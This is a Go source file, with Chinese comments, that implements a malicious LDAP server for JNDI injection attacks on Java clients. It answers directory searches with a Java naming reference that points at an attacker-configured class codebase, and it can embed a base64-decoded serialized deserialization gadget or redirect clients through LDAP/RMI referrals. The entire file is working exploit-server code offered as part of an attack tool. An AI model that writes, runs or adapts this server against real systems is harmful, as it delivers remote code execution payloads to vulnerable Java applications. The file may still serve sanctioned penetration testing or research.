package netcat

import (
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"strings"
	"time"
)

// 最小可用的 LDAPv3 应答实现（BER/DER 编解码），用于 JNDI 注入：
//   - BindRequest  → BindResponse(success)
//   - SearchRequest → SearchResultEntry(带 javaClassName/javaFactory/javaCodeBase/
//     javaReferenceAddress/javaSerializedData) + SearchResultDone
//     或直接返回 referral（resultCode 10），让客户端改连其它 LDAP/RMI 服务
//
// 不追求完整目录服务语义，只覆盖打 JNDI 客户端需要的交互。

const (
	ldapAppBindRequest  = 0x60
	ldapAppBindResponse = 0x61
	ldapAppUnbind       = 0x42
	ldapAppSearchReq    = 0x63
	ldapAppSearchEntry  = 0x64
	ldapAppSearchDone   = 0x65
	ldapAppModifyReq    = 0x66
	ldapAppExtReq       = 0x77
	ldapAppExtResponse  = 0x78
)

// ---------------------------------------------------------------- 编码

func berLen(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	var buf [4]byte
	binary.BigEndian.PutUint32(buf[:], uint32(n))
	i := 0
	for i < 3 && buf[i] == 0 {
		i++
	}
	out := []byte{0x80 | byte(4-i)}
	return append(out, buf[i:]...)
}

// tlv 组装 tag-length-value
func tlv(tag byte, body []byte) []byte {
	out := make([]byte, 0, 1+5+len(body))
	out = append(out, tag)
	out = append(out, berLen(len(body))...)
	return append(out, body...)
}

func berInt(v int) []byte {
	if v == 0 {
		return tlv(0x02, []byte{0})
	}
	var b []byte
	for x := v; x > 0; x >>= 8 {
		b = append([]byte{byte(x & 0xff)}, b...)
	}
	if b[0]&0x80 != 0 {
		b = append([]byte{0}, b...)
	}
	return tlv(0x02, b)
}

func berEnum(v int) []byte { return tlv(0x0a, []byte{byte(v)}) }

func berStr(s string) []byte { return tlv(0x04, []byte(s)) }

func berBytes(b []byte) []byte { return tlv(0x04, b) }

func berSeq(children ...[]byte) []byte { return tlv(0x30, concat(children...)) }

func concat(parts ...[]byte) []byte {
	n := 0
	for _, p := range parts {
		n += len(p)
	}
	out := make([]byte, 0, n)
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}

// ---------------------------------------------------------------- 解码

// parseTLV 解析一个 TLV，返回 tag / body / 剩余字节
func parseTLV(b []byte) (tag byte, body, rest []byte, err error) {
	if len(b) < 2 {
		return 0, nil, nil, io.ErrUnexpectedEOF
	}
	tag = b[0]
	l := int(b[1])
	hdr := 2
	if l&0x80 != 0 {
		k := l & 0x7f
		if k == 0 || k > 4 || len(b) < 2+k {
			return 0, nil, nil, fmt.Errorf("bad BER length")
		}
		l = 0
		for i := 0; i < k; i++ {
			l = l<<8 | int(b[2+i])
		}
		hdr = 2 + k
	}
	if len(b) < hdr+l {
		return 0, nil, nil, io.ErrUnexpectedEOF
	}
	return tag, b[hdr : hdr+l], b[hdr+l:], nil
}

// readLDAPMessage 从连接上读一条完整 LDAPMessage
func readLDAPMessage(r *bufio.Reader) ([]byte, error) {
	tag, err := r.ReadByte()
	if err != nil {
		return nil, err
	}
	if tag != 0x30 {
		return nil, fmt.Errorf("不是 LDAPMessage（tag=0x%02x）", tag)
	}
	first, err := r.ReadByte()
	if err != nil {
		return nil, err
	}
	hdr := []byte{tag, first}
	length := int(first)
	if first&0x80 != 0 {
		k := int(first & 0x7f)
		if k == 0 || k > 4 {
			return nil, fmt.Errorf("bad BER length")
		}
		lb := make([]byte, k)
		if _, err := io.ReadFull(r, lb); err != nil {
			return nil, err
		}
		hdr = append(hdr, lb...)
		length = 0
		for _, c := range lb {
			length = length<<8 | int(c)
		}
	}
	if length > 1<<20 {
		return nil, fmt.Errorf("LDAPMessage 过大：%d", length)
	}
	body := make([]byte, length)
	if _, err := io.ReadFull(r, body); err != nil {
		return nil, err
	}
	return append(hdr, body...), nil
}

// parseLDAPMessage 拆出 messageID 与 protocolOp
func parseLDAPMessage(pdu []byte) (msgID int, opTag byte, opBody []byte, err error) {
	_, body, _, err := parseTLV(pdu)
	if err != nil {
		return 0, 0, nil, err
	}
	idTag, idBody, rest, err := parseTLV(body)
	if err != nil || idTag != 0x02 || len(idBody) == 0 {
		return 0, 0, nil, fmt.Errorf("缺少 messageID")
	}
	for _, c := range idBody {
		msgID = msgID<<8 | int(c)
	}
	opTag, opBody, _, err = parseTLV(rest)
	if err != nil {
		return 0, 0, nil, err
	}
	return msgID, opTag, opBody, nil
}

// ---------------------------------------------------------------- 应答

func ldapBindResponse(msgID, code int) []byte {
	op := tlv(ldapAppBindResponse, concat(berEnum(code), berStr(""), berStr("")))
	return tlv(0x30, concat(berInt(msgID), op))
}

func ldapResultDone(msgID, code int, referral string) []byte {
	body := concat(berEnum(code), berStr(""), berStr(""))
	if referral != "" {
		// referral [3] Referral ::= SEQUENCE OF uri
		body = concat(body, tlv(0xa3, berStr(referral)))
	}
	op := tlv(ldapAppSearchDone, body)
	return tlv(0x30, concat(berInt(msgID), op))
}

func ldapExtResponse(msgID, code int) []byte {
	op := tlv(ldapAppExtResponse, concat(berEnum(code), berStr(""), berStr("")))
	return tlv(0x30, concat(berInt(msgID), op))
}

type ldapAttr struct {
	name  string
	value []byte
}

func ldapSearchEntry(msgID int, objectName string, attrs []ldapAttr) []byte {
	var enc []byte
	for _, a := range attrs {
		pa := tlv(0x30, concat(berStr(a.name), tlv(0x31, berBytes(a.value))))
		enc = append(enc, pa...)
	}
	body := concat(berStr(objectName), tlv(0x30, enc))
	return tlv(0x30, concat(berInt(msgID), tlv(ldapAppSearchEntry, body)))
}

// handleLDAP LDAP 模式的会话循环
func (s *session) handleLDAP() {
	if s.cfg.InitialDelayMs > 0 {
		waitOrClosed(s, s.cfg.InitialDelayMs)
	}
	br := bufio.NewReaderSize(s.conn, 64*1024)
	for {
		pdu, err := readLDAPMessage(br)
		if err != nil {
			return
		}
		// 原始请求也交给规则引擎（可用规则额外推送自定义 payload）
		s.onData(pdu)
		if s.isClosed() {
			return
		}
		msgID, op, opBody, err := parseLDAPMessage(pdu)
		if err != nil {
			s.listener.addEvent(eventError, s.remote, "LDAP 解析失败："+err.Error())
			return
		}
		switch op {
		case ldapAppBindRequest:
			s.send(ldapBindResponse(msgID, 0))
			s.listener.addEvent(eventInfo, s.remote, fmt.Sprintf("LDAP BindRequest（msgID=%d）→ success", msgID))
		case ldapAppSearchReq:
			s.respondLDAPSearch(msgID, opBody)
		case ldapAppUnbind:
			s.listener.addEvent(eventInfo, s.remote, "LDAP UnbindRequest，关闭连接")
			return
		case ldapAppExtReq:
			s.send(ldapExtResponse(msgID, 0))
			s.listener.addEvent(eventInfo, s.remote, "LDAP ExtendedRequest → success")
		default:
			s.send(ldapResultDone(msgID, 0, ""))
			s.listener.addEvent(eventInfo, s.remote, fmt.Sprintf("LDAP 请求 0x%02x → success（不解析内容）", op))
		}
	}
}

// respondLDAPSearch 回 SearchResultEntry（JNDI Reference）+ SearchResultDone
func (s *session) respondLDAPSearch(msgID int, reqBody []byte) {
	baseDN := parseBaseObject(reqBody)
	// 配置了 referral：直接让客户端改连指定 LDAP/RMI（resultCode 10）
	if s.cfg.LDAPReferral != "" {
		s.send(ldapResultDone(msgID, 10, s.cfg.LDAPReferral))
		s.listener.addEvent(eventInfo, s.remote,
			fmt.Sprintf("LDAP Search（base=%q）→ referral %s", baseDN, s.cfg.LDAPReferral))
		return
	}

	attrs := []ldapAttr{
		{name: "objectClass", value: []byte("javaNamingReference")},
		{name: "javaClassName", value: []byte(s.cfg.JavaClassName)},
	}
	if s.cfg.JavaFactory != "" {
		attrs = append(attrs, ldapAttr{name: "javaFactory", value: []byte(s.cfg.JavaFactory)})
	}
	if s.cfg.JavaCodeBase != "" {
		attrs = append(attrs, ldapAttr{name: "javaCodeBase", value: []byte(s.cfg.JavaCodeBase)})
	}
	if s.cfg.JNDIRefAddress != "" {
		attrs = append(attrs, ldapAttr{name: "javaReferenceAddress", value: []byte(s.cfg.JNDIRefAddress)})
	}
	// javaSerializedData：直接下发序列化 gadget（反序列化类利用）
	if s.cfg.JavaSerializedPayload != "" {
		if raw, err := decodeBase64Loose(s.cfg.JavaSerializedPayload); err == nil && len(raw) > 0 {
			attrs = append(attrs, ldapAttr{name: "javaSerializedData", value: raw})
			s.listener.addEvent(eventPayload, s.remote,
				fmt.Sprintf("SearchResultEntry 携带 javaSerializedData %d 字节", len(raw)))
		}
	}
	// 规则里配置了 file 载荷且没有配 javaSerializedData 时，把文件当序列化数据下发
	if s.cfg.JavaSerializedPayload == "" {
		for _, r := range s.cfg.Rules {
			if !r.Enabled || r.PayloadType != PayloadFile {
				continue
			}
			if b, err := resolvePayload(r); err == nil && len(b) > 0 {
				attrs = append(attrs, ldapAttr{name: "javaSerializedData", value: b})
				s.listener.addEvent(eventPayload, s.remote,
					fmt.Sprintf("SearchResultEntry 携带 javaSerializedData（规则「%s」）%d 字节", ruleLabel(r), len(b)))
				break
			}
		}
	}

	objectName := baseDN
	if objectName == "" {
		objectName = "ou=exploit,dc=example,dc=com"
	}
	s.send(ldapSearchEntry(msgID, objectName, attrs))
	s.send(ldapResultDone(msgID, 0, ""))
	s.listener.addEvent(eventInfo, s.remote,
		fmt.Sprintf("LDAP Search（base=%q）→ 已返回 Reference（className=%s, codeBase=%s）",
			baseDN, s.cfg.JavaClassName, s.cfg.JavaCodeBase))
}

// parseBaseObject 从 SearchRequest 的 body 里取第一个 OCTET STRING（baseObject）
func parseBaseObject(reqBody []byte) string {
	rest := reqBody
	for len(rest) > 0 {
		tag, body, r, err := parseTLV(rest)
		if err != nil {
			return ""
		}
		if tag == 0x04 {
			return string(body)
		}
		rest = r
	}
	return ""
}

// decodeBase64Loose 兼容 data URL 前缀与换行的 base64
func decodeBase64Loose(v string) ([]byte, error) {
	v = strings.TrimSpace(v)
	if i := strings.Index(v, "base64,"); i >= 0 {
		v = v[i+len("base64,"):]
	}
	v = strings.ReplaceAll(v, "\n", "")
	v = strings.ReplaceAll(v, "\r", "")
	v = strings.ReplaceAll(v, " ", "")
	return base64.StdEncoding.DecodeString(v)
}

// waitOrClosed 睡 ms 毫秒，会话结束则提前返回 true
func waitOrClosed(s *session, ms int) bool {
	if ms <= 0 {
		return false
	}
	select {
	case <-time.After(time.Duration(ms) * time.Millisecond):
		return false
	case <-s.closing:
		return true
	}
}
